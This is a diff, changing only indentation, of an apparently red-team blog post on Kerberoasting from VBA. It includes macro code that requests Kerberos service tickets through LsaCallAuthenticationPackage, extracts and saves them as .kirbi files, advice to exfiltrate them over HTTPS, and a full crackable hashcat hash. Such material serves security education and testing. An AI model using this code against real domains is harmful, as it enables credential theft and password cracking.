@@ -185,47 +185,47 @@ Keep in mind that the field defined as **`TargetNameBuffer`** is the **`PWSTR Bu
 To work with memory in VBA we use byte arrays. In order to add the target SPN string to the end of our structure, we need to create an array with the size of the struct, then get the pointer to the first element of this array (`VarPtr(yourArray(0))`), and use this address as destination (`RtlMoveMemory`). Then we convert this byte array to a string (`StrConv(array, vbUnicode)`) and concatenate the string with the target SPN. I ended with this weird method because VBA started to freak out in memory: I don't like how it is done, but it works.
 
 ```vb
-    'Copy the struct to an array and add the string with the target
-    Dim tmpBuffer() As Byte
-    Dim Dummy As String
-    ReDim tmpBuffer(0 To LenB(KerbRetrieveRequest) - 1)
-    Call CopyMemory(VarPtr(tmpBuffer(0)), VarPtr(KerbRetrieveRequest), LenB(KerbRetrieveRequest) - 1)
-    Dummy = StrConv(tmpBuffer, vbUnicode)
-    Dummy = Dummy & StrConv(target, vbUnicode)
+'Copy the struct to an array and add the string with the target
+Dim tmpBuffer() As Byte
+Dim Dummy As String
+ReDim tmpBuffer(0 To LenB(KerbRetrieveRequest) - 1)
+Call CopyMemory(VarPtr(tmpBuffer(0)), VarPtr(KerbRetrieveRequest), LenB(KerbRetrieveRequest) - 1)
+Dummy = StrConv(tmpBuffer, vbUnicode)
+Dummy = Dummy & StrConv(target, vbUnicode)
 ```
 
 At this point we have a string composed by our **`KERB_RETRIEVE_TKT_REQUEST`** + **`string with SPN`**, so we need to convert this to an array again, and get the memory address where our string is located at. Our structure has a size of 64 bytes, so the 65th byte is the first byte of our string: we can use **`VarPtr()`** again to get this value and set the **`TargetNameBuffer`** with this pointer later on:
 
 ```vb
-    'Get the buffer memory address
-    Dim fixedAddress As LongPtr
-    Dim tempToFix() As Byte
-    tempToFix = StrConv(Dummy, vbFromUnicode)
-    fixedAddress = VarPtr(tempToFix(64))
+'Get the buffer memory address
+Dim fixedAddress As LongPtr
+Dim tempToFix() As Byte
+tempToFix = StrConv(Dummy, vbFromUnicode)
+fixedAddress = VarPtr(tempToFix(64))
 ```
 
 In order to call **`LsaCallAuthenticationPackage`**, our message buffer must be created in the heap, so we need to allocate memory and copy it:
 
 ```vb
 'Alloc memory from heap and copy the struct
-    Dim heap As LongPtr
-    Dim mem As LongPtr
-    heap = GetProcessHeap()
-    mem = HeapAlloc(heap, 0, LenB(KerbRetrieveRequest) + LenB(target))
-    Call CopyMemory(mem, VarPtr(tempToFix(0)), LenB(KerbRetrieveRequest) + LenB(target))
+Dim heap As LongPtr
+Dim mem As LongPtr
+heap = GetProcessHeap()
+mem = HeapAlloc(heap, 0, LenB(KerbRetrieveRequest) + LenB(target))
+Call CopyMemory(mem, VarPtr(tempToFix(0)), LenB(KerbRetrieveRequest) + LenB(target))
 ```
 
 And finally, we can call the function after overwriting the **`TargetNameBuffer`** field with the address extracted before:
 
 ```vb
-    'Fix the buffer address
-    fixedAddress = mem + 64
-    Call CopyMemory(mem + 24, VarPtr(fixedAddress), 8)
-    'Do the call
-    Status = LsaCallAuthenticationPackage(pLogonHandle, pPackageId, mem, LenB(KerbRetrieveRequest) + LenB(target), KerbRetrieveResponse, ResponseSize, SubStatus)
-    If Status <> 0 Then
-        MsgBox "Error, LsaCallAuthenticationPackage failed!"
-    End If
+'Fix the buffer address
+fixedAddress = mem + 64
+Call CopyMemory(mem + 24, VarPtr(fixedAddress), 8)
+'Do the call
+Status = LsaCallAuthenticationPackage(pLogonHandle, pPackageId, mem, LenB(KerbRetrieveRequest) + LenB(target), KerbRetrieveResponse, ResponseSize, SubStatus)
+If Status <> 0 Then
+    MsgBox "Error, LsaCallAuthenticationPackage failed!"
+End If
 ```
 
 If everything went smoothly now we have a buffer (**`KerbRetrieveResponse`**) that is a **`KERB_RETRIEVE_TKT_RESPONSE`** structure:
@@ -270,34 +270,34 @@ KERB_RETRIEVE_TKT_RESPONSE in memory
 I highlighted a few pointers in green (the first pointers correspond to **`ServiceName`**, **`TargetName`**, **`ClientName`**, etc.), and the value of **`EncodedTicketSize`** in orange. After the **`EncodedTicketSize`**, the pointer (again in green) to the **`EncodedTicket`**. So to get our TGS ticket in KiRBi format (as Mimikatz does, for example) we need to extract the pointer to the encoded ticket (at offset 144) and read the amount of **`EncodedTicketSize`** bytes (this value is at offset 136):
 
 ```vb
-    'Ticket->EncodedTicketSize
-    Dim ticketSize As Integer
-    Call CopyMemory(VarPtr(ticketSize), VarPtr(Response(136)), 4)
+'Ticket->EncodedTicketSize
+Dim ticketSize As Integer
+Call CopyMemory(VarPtr(ticketSize), VarPtr(Response(136)), 4)
 
-    'Ticket->EncodedTicket (address)
-    Dim encodedTicketAddress As LongPtr
-    Call CopyMemory(VarPtr(encodedTicketAddress), VarPtr(Response(144)), 8)
+'Ticket->EncodedTicket (address)
+Dim encodedTicketAddress As LongPtr
+Call CopyMemory(VarPtr(encodedTicketAddress), VarPtr(Response(144)), 8)
 
-    'Ticket->EncodedTicket (value)
-    Dim encodedTicket() As Byte
-    ReDim encodedTicket(0 To ticketSize)
-    Call CopyMemory(VarPtr(encodedTicket(0)), encodedTicketAddress, ticketSize)
+'Ticket->EncodedTicket (value)
+Dim encodedTicket() As Byte
+ReDim encodedTicket(0 To ticketSize)
+Call CopyMemory(VarPtr(encodedTicket(0)), encodedTicketAddress, ticketSize)
 
-    'Save it
-    Dim fileName As String
-    fileName = Replace(target, "/", "_")
-    fileName = Replace(fileName, ":", "_")
-    MsgBox fileName
-    Open fileName & ".kirbi" For Binary Access Write As #1
-        lWritePos = 1
-        Put #1, lWritePos, encodedTicket
-    Close #1
+'Save it
+Dim fileName As String
+fileName = Replace(target, "/", "_")
+fileName = Replace(fileName, ":", "_")
+MsgBox fileName
+Open fileName & ".kirbi" For Binary Access Write As #1
+    lWritePos = 1
+    Put #1, lWritePos, encodedTicket
+Close #1
 ```
 
 Of course instead of saving them to disk, we should exfiltrate the ticket via HTTPs or any other method. Then we can convert the KiRBi ticket into a HashCat-friendly format using the [kirbi2hashcat.py](https://github.com/jarilaos/kirbi2hashcat/blob/master/kirbi2hashcat.py) script:
 
 ```bash
-mothra@arcadia ᐓ  ~/tmp python kirbi2hashcat.py  test.kirbi
+mothra@arcadia:/tmp|⇒  python kirbi2hashcat.py test.kirbi
 $krb5tgs$23$2c4b4631e22d9e82823810dd51b11e17$1c1c0be320175b6486644311922fed8e3ee5a900112edbabe50b11d1a9b1f4609d30499616a8beb93071914f3eeade1e582878a1ad8c5574fbbc689569797aba9039da9f04ba3d91c3f12a307455d25e221fff21807d9d8d7e75492290be4922cf027e01aeae3e74eda64f6a258445b7547db94e9b5a153746a81b46d5b9a9d1c15794fb3cd6c488ac437ccb6a2612edcda95a2474854c73413024363c7dc40f3938b6ea988e246847fab0ed19433617870c05555dcee9b335f34774098f66a022437b75e22a787c9285276cd68a173f12fa0fbb2c41dafbf30e960f7404daee3b33d188a567e89f381e54936dfae1e3da74c6c50315308fa5dcb5af4e1e1ac9b2df5385cd8755365675c3aa8126ad62b24d5738c7ab665529c36aa09edc8a9935949142ccb75ade84596cf973700590d51e449eafb86a7b5149b89cb1232ac7823145c857d0762cbaf9c8a175e0783becd0c3f12dbf1ce02bca6d18e0d6a42949f5ac9a2442a94b1176ad3da71884be36da506c5e0aa2faf503c2ac5197b75ab1bce9f55abfbb8b374cfeacebac5a3d4ce3d01c23ce62312d5906846ea0b47d74b740dd5a1eac1451f599c6a0b6827bbe2a434a93646cb6990133392508b4e4650f635ae214b47cc1e7e135bd4d6ceaa188a61abd3dcbb5355a7fb48d6041bb6ff2c19b2a38fd2ec001e49794c61b0162393a94ba33da8d06df500cb39965ace726f542aacf2715f24c3a22e8e82c50f3b36f4ebb168c46f524c2c142521dca1e597e316fbf7ec1b7cb8810e63f39062d8369cf44e4b085bb1c85b7813c771644eaf7dfc7bce47238d77a5254edf5b179a4b34c1e567bb46aea4f965539f4e87425ceb17badcbd079dfc01d2a99270476592c4f4ea2718e3a55f6d8f61688b40669d0a13a3c3937feabc54a11e038e4c5a336273fd4601b5853d1e5df0d9a945cc2dbf2500c6f7bfc3099d386b9d7078b0f5850be93c4e2e220fbee3b19fdf3f9e18148495f409eb1b94fb43898bcdf512e32e4689d6e7414d2e51a8a605e5db0ca79f8dc5b0a34e3969dd5cca607aa0d63bc0146df647ae6126375a7723f1439401f1646f1be6c6cf98c27ab6bf3f3e4d571e8670288be55d11f5530aafff5fdecd108542ea78dfc1427e46761176dc5923418114164502d2981c03e7d3632ebb308d8f5e5ae258a7b545d95d25ba85139de8acafe20814e6074d1ed4528dd0ae8e69bf5dc18248a7ccb111bbcc13fa91d7eae0d5d688121d9fae6a574e0154dedeb3049e5f6c1c458950b3000e3174aec2d750cfc08ac8f29818b504e89feec8e68d2dc82a0211816ebe05c22c990692ba971bda7f4900262701873532c611a49b8e85c7a2fb4ab0ae79ca579e14a4a7fb3829a730b0e8e19d7e97a1ba05c17f9baafa52ca702e31bb7874cfa0db0af1452185987fbc991e333870268eb3cdf78008570f7f65ae4db99cfc10874f5c5c036af163ffe5ca35231904933b661b482bdcb04a75dcd626b3ce75b257df36b06589cae1ad73539f5de1f88e8b329e0999f56977ad9ef85a5d8dff00c89d121565ae720a3f4b458f84f46418dbe67f06600a600bb33d469cadd61061ca6ee1a6b4e0a011bb74b5c73d4361ebf2391b6fc9bf8a36ae63bb67a6dd5ebabc4d1
 ```
 
